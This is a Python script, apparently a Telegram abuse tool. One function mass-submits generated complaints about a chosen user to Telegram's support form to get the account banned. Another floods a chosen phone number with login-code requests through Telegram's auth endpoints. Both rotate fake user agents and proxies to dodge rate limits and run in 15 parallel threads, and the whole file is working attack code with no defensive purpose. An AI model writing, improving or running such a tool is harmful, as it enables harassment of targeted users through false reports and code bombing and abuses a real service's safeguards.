import requests
from fake_useragent import UserAgent
import random
from pystyle import Colors as cr
from pystyle import Colorate
import time
from proxies import get
from gen import gen_en
from threading import Thread

ch = lambda cr, text: Colorate.Horizontal(cr, text)

def snos_g(user, report):
	url = 'https://telegram.org/support'
	for _ in range(50):
		user_agent = UserAgent().random
		headers = {'User-Agent': user_agent}
		payload = gen_en(user, report)
		proxies = get()
		time.sleep(random.uniform(0.01, 1.00))
		response = requests.post(url, headers=headers, data=payload, proxies=proxies)
		print(cr.green, "Успешно")

def codes_g(number):
	for _ in range(50):
		url = random.choice(["https://telegram.org/support?setln=ru", "https://my.telegram.org/auth", 'https://my.telegram.org/auth/send_password'])
		user_agent = UserAgent().random
		headers = {'User-Agent': user_agent}
		payload = {"phone": number}
		proxies = get()
		time.sleep(random.uniform(0.01, 1.00))
		response = requests.post(url, headers=headers, data=payload, proxies=proxies)
		print("Успешно")

def tread(target, args):
	threads = []
	for _ in range(15):
		threads.append(Thread(target=target, args=args))
	for thread in threads:
		thread.start()
	for thread in threads:
		thread.join()
